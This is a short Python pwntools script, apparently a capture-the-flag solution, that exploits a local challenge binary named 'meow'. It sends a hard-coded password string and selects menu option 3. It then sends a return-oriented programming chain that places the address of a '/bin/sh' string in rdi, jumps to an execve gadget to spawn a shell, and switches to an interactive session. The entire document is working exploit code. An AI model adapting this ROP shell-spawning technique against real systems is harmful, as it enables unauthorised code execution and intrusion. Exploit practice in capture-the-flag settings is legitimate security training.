from pwn import *
from time import sleep

context.arch = 'x86_64'

#use rop in 0x14000 which the author gives
pop_rdi = 0x14036
bin_sh = 0x14029
execve = 0x14000

r = process('./meow')

r.sendline('$W337k!++y')
print r.recvuntil('= ')
r.sendline('3')
print r.recvuntil('>>>')
r.send(flat(pop_rdi, bin_sh, execve))

r.interactive()
